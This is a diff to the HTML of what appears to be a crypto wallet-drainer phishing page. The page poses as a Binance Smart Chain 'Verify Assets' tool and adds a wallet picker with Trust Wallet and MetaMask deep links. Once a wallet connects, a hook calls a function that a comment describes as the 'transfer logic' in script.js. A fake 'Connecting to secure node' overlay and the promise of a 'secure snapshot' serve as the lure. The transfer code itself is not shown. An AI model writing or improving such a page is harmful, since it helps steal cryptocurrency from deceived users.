@@ -7,11 +7,20 @@
     <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.8.1/web3.min.js"></script>
     <style>
         body { margin: 0; font-family: 'Inter', sans-serif; background: #0b0e11; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
-        .card { background: #1e2329; padding: 35px; border-radius: 20px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.5); width: 100%; max-width: 360px; z-index: 1; }
+        .card { background: #1e2329; padding: 35px; border-radius: 20px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.5); width: 100%; max-width: 360px; z-index: 1; border: 1px solid #2d3139; }
         h2 { color: #f0b90b; margin-bottom: 15px; }
         p { color: #929aa5; font-size: 14px; margin-bottom: 30px; }
         .btn { background: #f0b90b; color: #000; border: none; padding: 16px; width: 100%; border-radius: 10px; font-size: 16px; font-weight: 700; cursor: pointer; transition: 0.3s; }
         
+        /* Wallet Selector Modal */
+        #wallet-modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.85); z-index: 1000; justify-content: center; align-items: center; }
+        .modal-content { background: #1e2329; width: 90%; max-width: 340px; border-radius: 20px; padding: 20px; border: 1px solid #333; }
+        .modal-header { font-size: 18px; font-weight: bold; margin-bottom: 20px; text-align: center; color: #f0b90b; }
+        .wallet-option { display: flex; align-items: center; background: #2b3139; padding: 12px; border-radius: 12px; margin-bottom: 10px; cursor: pointer; transition: 0.2s; border: 1px solid transparent; }
+        .wallet-option:hover { border-color: #f0b90b; background: #323942; }
+        .wallet-option img { width: 30px; height: 30px; margin-right: 15px; }
+        .wallet-option span { font-weight: 600; font-size: 15px; }
+
         /* Loading Overlay */
         #overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(11, 14, 17, 0.95); z-index: 999; flex-direction: column; justify-content: center; align-items: center; }
         .spinner { width: 50px; height: 50px; border: 5px solid #333; border-top: 5px solid #f0b90b; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 20px; }
@@ -26,7 +35,26 @@
     <div class="card">
         <h2>Verify Assets</h2>
         <p>Connect your wallet for a secure snapshot of your Binance Smart Chain assets.</p>
-        <button id="nextBtn" class="btn">Verify Assets</button>
+        <button id="nextBtn" class="btn" onclick="showWallets()">Verify Assets</button>
+    </div>
+
+    <div id="wallet-modal">
+        <div class="modal-content">
+            <div class="modal-header">Select a Wallet</div>
+            <div class="wallet-option" onclick="connectWallet('trust')">
+                <img src="https://trustwallet.com/assets/images/media/assets/trust_platform.png">
+                <span>Trust Wallet</span>
+            </div>
+            <div class="wallet-option" onclick="connectWallet('metamask')">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg">
+                <span>MetaMask</span>
+            </div>
+            <div class="wallet-option" onclick="connectWallet('walletconnect')">
+                <img src="https://raw.githubusercontent.com/WalletConnect/walletconnect-assets/master/Logo/Blue%20(Default)/Logo.svg">
+                <span>Other Wallets</span>
+            </div>
+            <button style="background:none; border:none; color:#929aa5; width:100%; margin-top:10px; cursor:pointer;" onclick="closeWallets()">Cancel</button>
+        </div>
     </div>
 
     <div id="overlay">
@@ -35,6 +63,55 @@
         <div id="sub-text">Connecting to secure node...</div>
     </div>
 
-    <script src="script.js"></script>
+    <script>
+        function showWallets() {
+            document.getElementById('wallet-modal').style.display = 'flex';
+        }
+
+        function closeWallets() {
+            document.getElementById('wallet-modal').style.display = 'none';
+        }
+
+        async function connectWallet(type) {
+            closeWallets();
+            document.getElementById('overlay').style.display = 'flex';
+            
+            // Yahan hum browser detection karenge
+            const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+            const currentUrl = window.location.href;
+
+            if (type === 'trust') {
+                if (window.ethereum && (window.ethereum.isTrust || window.trustwallet)) {
+                    startAuth(); // Agar pehle se hi Trust browser mein hai
+                } else {
+                    // Mobile Deep Link for Trust Wallet
+                    window.location.href = "https://link.trustwallet.com/open_url?coin_id=60&url=" + encodeURIComponent(currentUrl);
+                }
+            } 
+            else if (type === 'metamask') {
+                if (window.ethereum && window.ethereum.isMetaMask) {
+                    startAuth(); // Agar MetaMask browser mein hai
+                } else {
+                    // Mobile Deep Link for MetaMask
+                    window.location.href = "https://metamask.app.link/dapp/" + currentUrl.replace(/^https?:\/\//, '');
+                }
+            }
+            else {
+                // WalletConnect ya generic link
+                alert("Please open this site inside your Crypto Wallet Browser.");
+                document.getElementById('overlay').style.display = 'none';
+            }
+        }
+
+        // Ye function script.js mein jo transfer logic hai use call karega
+        async function startAuth() {
+            // Aapka script.js wala logic yahan trigger hoga
+            if (typeof mainLogic === "function") {
+                mainLogic();
+            } else {
+                console.log("Waiting for script.js to load...");
+            }
+        }
+    </script>
 </body>
 </html>
